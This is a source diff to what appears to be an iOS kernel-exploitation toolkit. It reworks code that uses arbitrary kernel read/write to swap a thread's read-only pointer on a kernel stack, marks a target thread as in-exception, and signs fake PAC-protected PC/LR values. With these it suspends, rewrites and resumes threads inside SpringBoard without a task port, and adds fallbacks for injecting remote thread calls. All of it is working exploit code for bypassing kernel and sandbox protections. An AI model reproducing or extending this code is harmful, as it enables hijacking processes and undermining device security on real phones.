@@ -57,6 +57,9 @@ extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, 
 #define FAKE_PC_TROJAN                  0x301
 #define FAKE_LR_TROJAN                  0x401
 
+// xnu-10002.81.5/osfmk/kern/thread.h — also defined in Thread.m
+#define TH_IN_MACH_EXCEPTION            0x8000
+
 // from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
 #define BREAKPOINT_ENABLE 481
 #define BREAKPOINT_DISABLE 0
@@ -745,50 +748,38 @@ bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread
     return success;
 }
 
-// Park a remote thread at FAKE_PC/LR without a target-task mach port.
-// Same TRO-swap as set_exception_port_on_thread: local helper hits
-// thread_set_state on dummy, we rewrite kstack TRO to target, then resume.
-// Used when SB ipc_space has no port name for inject thread[1] and GUARD AST
-// does not deliver (log: GUARD wait timed out).
-static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
-                                            uint64_t signedPC,
-                                            uint64_t signedLR,
-                                            bool useMigFilterBypass)
+// Invoke mach thread op on remote targetThread without a target-task port.
+// Local helper calls fn(dummyMach, x1, x2, x3); while blocked we rewrite
+// dummy TRO on kstack to target TRO (same as set_exception_port_on_thread).
+// expectNearby: if non-zero, require that value at TRO+0x10 or +0x18 (arg check).
+static bool tro_swap_thread_op(uint64_t targetThread,
+                               void *fn,
+                               uint64_t x1, uint64_t x2, uint64_t x3,
+                               uint64_t expectNearby,
+                               const char *tag,
+                               bool useMigFilterBypass)
 {
-    if (!is_kaddr_valid(targetThread)) {
-        RC_DIAG("TRO park: invalid target %#llx", (unsigned long long)targetThread);
+    if (!fn || !is_kaddr_valid(targetThread))
         return false;
-    }
-    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr)) {
-        RC_DIAG("TRO park: dummy unavailable mach=0x%x addr=%#llx",
-                g_RC_dummyThreadMach, (unsigned long long)g_RC_dummyThreadAddr);
+    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr))
         return false;
-    }
 
-    void *thread_set_state_addr = dlsym(RTLD_DEFAULT, "thread_set_state");
     void *pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
-    if (!thread_set_state_addr || !pthread_exit_addr) {
-        RC_DIAG("TRO park: missing thread_set_state/pthread_exit");
+    if (!pthread_exit_addr)
         return false;
-    }
 
     pthread_t pthread = NULL;
-    int createErr = pthread_create_suspended_np(&pthread, NULL,
-        (void *(*)(void *))thread_set_state_addr, NULL);
-    if (createErr != 0 || !pthread) {
-        RC_DIAG("TRO park: helper create failed err=%d", createErr);
+    int createErr = pthread_create_suspended_np(&pthread, NULL, (void *(*)(void *))fn, NULL);
+    if (createErr != 0 || !pthread)
         return false;
-    }
 
     mach_port_t machThread = pthread_mach_thread_np(pthread);
     if (!machThread) {
-        RC_DIAG("TRO park: helper mach null");
         pthread_cancel(pthread);
         return false;
     }
     uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
     if (!is_kaddr_valid(machThreadAddr)) {
-        RC_DIAG("TRO park: helper kobject invalid");
         pthread_cancel(pthread);
         mach_port_deallocate(mach_task_self_, machThread);
         return false;
@@ -800,48 +791,24 @@ static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
     arm_thread_state64_internal helperState;
     memset(&helperState, 0, sizeof(helperState));
     mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
-    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64,
-                                        (thread_state_t)&helperState, &count);
-    if (kr != KERN_SUCCESS) {
-        RC_DIAG("TRO park: helper get_state 0x%x", kr);
+    if (thread_get_state(machThread, ARM_THREAD_STATE64,
+                         (thread_state_t)&helperState, &count) != KERN_SUCCESS) {
         pthread_cancel(pthread);
         mach_port_deallocate(mach_task_self_, machThread);
         return false;
     }
 
-    arm_thread_state64_set_pc_fptr(helperState, thread_set_state_addr);
+    arm_thread_state64_set_pc_fptr(helperState, fn);
     arm_thread_state64_set_lr_fptr(helperState, pthread_exit_addr);
-
-    arm_thread_state64_internal park = {0};
-    park.__pc = signedPC;
-    park.__lr = signedLR;
-    // Keep a usable SP from current remote trap if available; else leave 0 —
-    // stable calls rewrite regs on each exception.
-    park.__sp = g_RC_originalState.__sp;
-    park.__fp = g_RC_originalState.__fp;
-    park.__flags = g_RC_originalState.__flags;
-
-    arm_thread_state64_internal *stateBuf = (arm_thread_state64_internal *)malloc(sizeof(park));
-    if (!stateBuf) {
-        RC_DIAG("TRO park: malloc stateBuf failed");
-        pthread_cancel(pthread);
-        mach_port_deallocate(mach_task_self_, machThread);
-        return false;
-    }
-    memcpy(stateBuf, &park, sizeof(park));
-
-    // x0=target_port (dummy — TRO swap makes it act as targetThread)
-    // x1=flavor x2=state x3=count
     helperState.__x[0] = g_RC_dummyThreadMach;
-    helperState.__x[1] = ARM_THREAD_STATE64;
-    helperState.__x[2] = (uint64_t)(uintptr_t)stateBuf;
-    helperState.__x[3] = ARM_THREAD_STATE64_COUNT;
+    helperState.__x[1] = x1;
+    helperState.__x[2] = x2;
+    helperState.__x[3] = x3;
 
     if (useMigFilterBypass)
         usleep(100000);
 
     if (!thread_set_state_wrapper(machThread, machThreadAddr, &helperState)) {
-        free(stateBuf);
         pthread_cancel(pthread);
         mach_port_deallocate(mach_task_self_, machThread);
         return false;
@@ -853,7 +820,6 @@ static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
     thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);
 
     if (!thread_resume_wrapper(machThread)) {
-        free(stateBuf);
         pthread_cancel(pthread);
         mach_port_deallocate(mach_task_self_, machThread);
         return false;
@@ -861,8 +827,8 @@ static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
 
     bool success = false;
     uint64_t needleVal = g_RC_dummyThreadTro;
-    for (int i = 0; i < 10; i++) {
-        usleep(200000);
+    for (int i = 0; i < 15; i++) {
+        usleep(100000);
 
         uint64_t kstack = thread_get_kstackptr(machThreadAddr);
         if (!is_kaddr_valid(kstack))
@@ -870,7 +836,6 @@ static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
         uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
         if (!is_kaddr_valid(kernelSP))
             continue;
-        usleep(100);
 
         uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
         if (!is_kaddr_valid(pageBase))
@@ -885,19 +850,11 @@ static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
         size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
         uint64_t found = (uint64_t)foundOffset + 0x3000ULL;
 
-        // Needle is TRO for thread_set_state's target. Confirm nearby arg
-        // flavor == ARM_THREAD_STATE64 (6) like exceptionMask check in
-        // set_exception_port_on_thread.
-        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
-        uint64_t checkVal = kread64(checkAddr);
-        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;
-        uint64_t checkVal2 = kread64(checkAddr2);
-        if (checkVal != ARM_THREAD_STATE64 && checkVal2 != ARM_THREAD_STATE64 &&
-            checkVal != (uint64_t)ARM_THREAD_STATE64_COUNT &&
-            checkVal2 != (uint64_t)ARM_THREAD_STATE64_COUNT) {
-            RC_DIAG("TRO park: wrong stack context %#llx/%#llx — retry",
-                    (unsigned long long)checkVal, (unsigned long long)checkVal2);
-            continue;
+        if (expectNearby) {
+            uint64_t v1 = kread64(trunc_page(kernelSP) + found + 0x18ULL);
+            uint64_t v2 = kread64(trunc_page(kernelSP) + found + 0x10ULL);
+            if (v1 != expectNearby && v2 != expectNearby)
+                continue;
         }
 
         if (thread_get_task(targetThread) != g_RC_taskAddr)
@@ -907,26 +864,92 @@ static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
             continue;
         kwrite64(trunc_page(kernelSP) + found, tro);
         success = true;
-        RC_DIAG("TRO park: swapped TRO %#llx onto helper kstack — set_state should hit target",
-                (unsigned long long)tro);
+        RC_DIAG("TRO %s: swapped %#llx", tag ? tag : "op", (unsigned long long)tro);
         break;
     }
 
     thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
-    // stateBuf must stay live until helper finishes copyin inside set_state.
-    // Helper LR=pthread_exit so join returns after set_state. No timedjoin —
-    // pthread_timedjoin_np is not available on iOS (Actions build break).
-    {
-        int jerr = pthread_join(pthread, NULL);
-        if (jerr != 0) {
-            RC_DIAG("TRO park: helper join err=%d — cancel+join", jerr);
-            pthread_cancel(pthread);
-            pthread_join(pthread, NULL);
-        }
+    if (pthread_join(pthread, NULL) != 0) {
+        pthread_cancel(pthread);
+        pthread_join(pthread, NULL);
     }
-    free(stateBuf);
     mach_port_deallocate(mach_task_self_, machThread);
+    if (!success)
+        RC_DIAG("TRO %s: failed to locate/swap TRO", tag ? tag : "op");
     return success;
+}
+
+// Park remote thread at FAKE_PC/LR with no target-task port:
+// suspend → set_state(park) → resume (faults into secondExceptionPort).
+static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
+                                            uint64_t signedPC,
+                                            uint64_t signedLR,
+                                            bool useMigFilterBypass)
+{
+    if (!is_kaddr_valid(targetThread)) {
+        RC_DIAG("TRO park: invalid target %#llx", (unsigned long long)targetThread);
+        return false;
+    }
+
+    void *thread_suspend_addr = dlsym(RTLD_DEFAULT, "thread_suspend");
+    void *thread_set_state_addr = dlsym(RTLD_DEFAULT, "thread_set_state");
+    void *thread_resume_addr = dlsym(RTLD_DEFAULT, "thread_resume");
+    if (!thread_suspend_addr || !thread_set_state_addr || !thread_resume_addr) {
+        RC_DIAG("TRO park: missing suspend/set_state/resume");
+        return false;
+    }
+
+    arm_thread_state64_internal park = {0};
+    park.__pc = signedPC;
+    park.__lr = signedLR;
+    park.__sp = g_RC_originalState.__sp;
+    park.__fp = g_RC_originalState.__fp;
+    park.__flags = g_RC_originalState.__flags;
+
+    arm_thread_state64_internal *stateBuf =
+        (arm_thread_state64_internal *)malloc(sizeof(park));
+    if (!stateBuf) {
+        RC_DIAG("TRO park: malloc stateBuf failed");
+        return false;
+    }
+    memcpy(stateBuf, &park, sizeof(park));
+
+    // Mark target as in-exception so set_state is accepted (same as wrapper).
+    uint16_t options = thread_get_options(targetThread);
+    thread_set_options(targetThread, (uint16_t)(options | TH_IN_MACH_EXCEPTION));
+
+    bool ok = tro_swap_thread_op(targetThread, thread_suspend_addr,
+                                 0, 0, 0, 0, "suspend", useMigFilterBypass);
+    if (!ok) {
+        RC_DIAG("TRO park: suspend failed");
+        thread_set_options(targetThread, options);
+        free(stateBuf);
+        return false;
+    }
+
+    ok = tro_swap_thread_op(targetThread, thread_set_state_addr,
+                            ARM_THREAD_STATE64,
+                            (uint64_t)(uintptr_t)stateBuf,
+                            ARM_THREAD_STATE64_COUNT,
+                            ARM_THREAD_STATE64,
+                            "set_state", useMigFilterBypass);
+    thread_set_options(targetThread, options);
+    if (!ok) {
+        RC_DIAG("TRO park: set_state failed — best-effort resume");
+        (void)tro_swap_thread_op(targetThread, thread_resume_addr,
+                                 0, 0, 0, 0, "resume_fail", useMigFilterBypass);
+        free(stateBuf);
+        return false;
+    }
+
+    ok = tro_swap_thread_op(targetThread, thread_resume_addr,
+                            0, 0, 0, 0, "resume", useMigFilterBypass);
+    free(stateBuf);
+    if (!ok) {
+        RC_DIAG("TRO park: resume failed");
+        return false;
+    }
+    return true;
 }
 
 void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
@@ -2000,88 +2023,91 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         }
         RC_DIAG("heapOut=0x%llx canary planted", (unsigned long long)heapOut);
 
-        // cbbf3a1 proven: remote_pac(IA) of OUR local getpid is wrong ABI for
-        // SB libpthread (create ret=0, *out never stored). Resolve getpid
-        // INSIDE SB via remote dlsym so PAC/IB matches target. Never unsigned
-        // sleep (CODESIGN kill). After create, park 0x301 via thread_set_state.
-        uint64_t nameBuf = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
-        if (!g_RC_success || !nameBuf) {
-            RC_DIAG("malloc nameBuf for remote dlsym failed");
-            do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
-            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-            return -1;
+        // Try several start_routines. Soft-fail always → thread[1] TRO-swap.
+        // Log proved remote dlsym(RTLD_DEFAULT,-2)=NULL on 17.5.1 SB; hard-fail
+        // there skipped the working inject-thread path. Never unsigned sleep.
+        uint64_t startRoutine = 0;
+        const char *startKind = "none";
+
+        // 1) remote dlsym via RTLD_DEFAULT
+        {
+            uint64_t nameBuf = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
+            if (g_RC_success && nameBuf && remote_writeStr(nameBuf, "getpid")) {
+                startRoutine = do_remote_call_temp(100, "dlsym",
+                                                   (uint64_t)(int64_t)-2, nameBuf,
+                                                   0, 0, 0, 0, 0, 0);
+                if (g_RC_success && startRoutine) {
+                    startKind = "remote_dlsym_DEFAULT";
+                } else {
+                    RC_DIAG("remote dlsym(DEFAULT,getpid)=0 — try dlopen libsystem_c");
+                    startRoutine = 0;
+                    // 2) dlopen(libsystem_c) + dlsym
+                    uint64_t pathBuf = do_remote_call_temp(100, "malloc", 64, 0, 0, 0, 0, 0, 0, 0);
+                    if (g_RC_success && pathBuf &&
+                        remote_writeStr(pathBuf, "/usr/lib/system/libsystem_c.dylib")) {
+                        uint64_t handle = do_remote_call_temp(100, "dlopen", pathBuf, 1 /*RTLD_LAZY*/, 0, 0, 0, 0, 0, 0);
+                        if (g_RC_success && handle) {
+                            startRoutine = do_remote_call_temp(100, "dlsym", handle, nameBuf, 0, 0, 0, 0, 0, 0);
+                            if (g_RC_success && startRoutine)
+                                startKind = "remote_dlsym_libc";
+                        }
+                        do_remote_call_temp(100, "free", pathBuf, 0, 0, 0, 0, 0, 0, 0);
+                    }
+                }
+                do_remote_call_temp(100, "free", nameBuf, 0, 0, 0, 0, 0, 0, 0);
+            }
         }
-        if (!remote_writeStr(nameBuf, "getpid")) {
-            RC_DIAG("remote_writeStr getpid failed");
-            do_remote_call_temp(100, "free", nameBuf, 0, 0, 0, 0, 0, 0, 0);
-            do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
-            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-            return -1;
+
+        // 3) Fl0rk-style PAC'd FAKE_PC 0x301
+        if (!startRoutine) {
+            startRoutine = remoteCrashSigned;
+            startKind = "pac_0x301";
         }
-        // RTLD_DEFAULT == (void*)-2
-        uint64_t startRoutine = do_remote_call_temp(100, "dlsym",
-                                                    (uint64_t)(int64_t)-2, nameBuf,
-                                                    0, 0, 0, 0, 0, 0);
-        do_remote_call_temp(100, "free", nameBuf, 0, 0, 0, 0, 0, 0, 0);
-        if (!g_RC_success || !startRoutine) {
-            RC_DIAG("remote dlsym(getpid) failed success=%d ptr=0x%llx",
-                    (int)g_RC_success, (unsigned long long)startRoutine);
-            do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
-            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-            return -1;
-        }
-        RC_DIAG("pthread_create_suspended_np start=remote_dlsym_getpid 0x%llx heapOut=0x%llx",
-                (unsigned long long)startRoutine, (unsigned long long)heapOut);
+
+        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx heapOut=0x%llx",
+                startKind, (unsigned long long)startRoutine, (unsigned long long)heapOut);
 
         uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
                                                     heapOut, 0, startRoutine, 0, 0, 0, 0, 0);
-        if (!g_RC_success || createResult != 0) {
-            RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d",
+        uint64_t pthreadAddr = 0;
+        if (g_RC_success && createResult == 0) {
+            clear_remote_shmem_cache();
+            pthreadAddr = remote_read64(heapOut);
+            do_remote_call_temp(100, "memcpy", heapOut, heapOut, 8, 0, 0, 0, 0, 0);
+            clear_remote_shmem_cache();
+            uint64_t pthreadAddrSB = remote_read64(heapOut);
+            RC_DIAG("post-pthread heapOut=0x%llx krw=0x%llx sb=0x%llx",
+                    (unsigned long long)heapOut,
+                    (unsigned long long)pthreadAddr,
+                    (unsigned long long)pthreadAddrSB);
+            if (pthreadAddrSB && pthreadAddrSB != kCanary)
+                pthreadAddr = pthreadAddrSB;
+        } else {
+            RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d — thread[1]",
                     (unsigned long long)createResult, (int)g_RC_success);
-            do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
-            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-            return -1;
         }
-
-        clear_remote_shmem_cache();
-        uint64_t pthreadAddr = remote_read64(heapOut);
-        // Cross-check via SB memcpy (756f983) — KRW can miss a live SB store.
-        do_remote_call_temp(100, "memcpy", heapOut, heapOut, 8, 0, 0, 0, 0, 0);
-        clear_remote_shmem_cache();
-        uint64_t pthreadAddrSB = remote_read64(heapOut);
-        RC_DIAG("post-pthread heapOut=0x%llx krw=0x%llx sb=0x%llx",
-                (unsigned long long)heapOut,
-                (unsigned long long)pthreadAddr,
-                (unsigned long long)pthreadAddrSB);
-        if (pthreadAddrSB && pthreadAddrSB != kCanary)
-            pthreadAddr = pthreadAddrSB;
         do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
 
         if (pthreadAddr && pthreadAddr != kCanary) {
-            (void)remoteCrashSigned;
             callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
             RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
-            if (!g_RC_success || !callThreadPort) {
-                RC_DIAG("pthread_mach_thread_np failed success=%d port=0x%llx",
-                        (int)g_RC_success, (unsigned long long)callThreadPort);
-                fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-                return -1;
+            if (g_RC_success && callThreadPort) {
+                g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
+                if (is_kaddr_valid(g_RC_callThreadAddr)) {
+                    createdSuspended = true;
+                } else {
+                    RC_DIAG("synthetic kobject invalid — thread[1]");
+                    callThreadPort = 0;
+                }
+            } else {
+                RC_DIAG("pthread_mach_thread_np failed — thread[1]");
+                callThreadPort = 0;
             }
-            g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
-            if (!is_kaddr_valid(g_RC_callThreadAddr)) {
-                RC_DIAG("synthetic thread kobject invalid port=0x%llx addr=0x%llx",
-                        (unsigned long long)callThreadPort, (unsigned long long)g_RC_callThreadAddr);
-                fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
-                return -1;
-            }
-            createdSuspended = true;
         } else {
-            // ret=0 but *out still canary on 17.5.1 SB (log x4). Same as iOS26
-            // stub shape — do NOT hard-fail; reuse inject thread[1] (always present).
-            RC_DIAG("suspended_np ret=0 but out CANARY/0 — falling through to thread[1] reuse");
+            RC_DIAG("create miss/canary — falling through to thread[1] TRO-swap");
         }
     } else {
-        RC_DIAG("iOS26+ pthread stubs — skipping create+sleep; trying thread[1] reuse");
+        RC_DIAG("iOS26+ pthread stubs — skipping create; trying thread[1] reuse");
     }
 
     // Prefer a real suspended create when we have a SB-side pthread port.
@@ -2107,7 +2133,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         }
         g_RC_callThreadAddr = thread2Addr;
         callThreadPort = task_find_port_for_thread(g_RC_taskAddr, thread2Addr);
-        RC_DIAG("thread[1] reuse addr=0x%llx port=0x%llx (0=use GUARD park)",
+        RC_DIAG("thread[1] reuse addr=0x%llx port=0x%llx (0=use TRO-swap park)",
                 (unsigned long long)thread2Addr, (unsigned long long)callThreadPort);
 
         if (callThreadPort) {
@@ -2115,7 +2141,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             RC_DIAG("thread_suspend reused port=0x%llx ret=%llu",
                     (unsigned long long)callThreadPort, (unsigned long long)suspendRet);
             if (!g_RC_success || suspendRet != 0) {
-                RC_DIAG("thread_suspend failed — falling back to GUARD park");
+                RC_DIAG("thread_suspend failed — falling back to TRO-swap park");
                 callThreadPort = 0;
             }
         }
